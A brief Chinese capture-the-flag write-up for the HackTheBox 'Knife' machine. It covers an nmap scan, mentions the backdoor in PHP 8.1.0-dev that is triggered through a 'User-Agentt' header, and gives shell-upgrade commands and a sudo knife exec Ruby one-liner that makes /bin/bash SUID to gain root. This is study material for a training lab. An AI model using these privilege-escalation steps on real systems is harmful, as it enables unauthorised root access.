# 原创
：  HackTheBox-Knife

# HackTheBox-Knife

#### HackTheBox-Knife

## 连接配置

> 



## 渗透测试

### 信息搜集

> 



```
sudo nmap 10.10.10.242

```

> 



### 漏洞挖掘

> 
联想到题目名字应该是存在后门，查看源码和抓包分析后发现存在 `PHP/8.1.0-dev`，该版本在2021年3月28日被植入后门，当服务器存在该后门时攻击者可以通过发送 `User-Agentt` 头来执行任意代码


> 



### getshell

> 



```
python3 -c 'import pyt;pty.spawn("/bin/bash")'
或者
SHELL=/bin/bash script -q /dev/null

```

> 



### 提权

> 



```
sudo -l
ls /usr/bin/knife -al

```

> 



```
echo "system('chmod +s /bin/bash')" &gt; exploit.rb
sudo /usr/bin/knife exec exploit.rb
/bin/bash -p

```
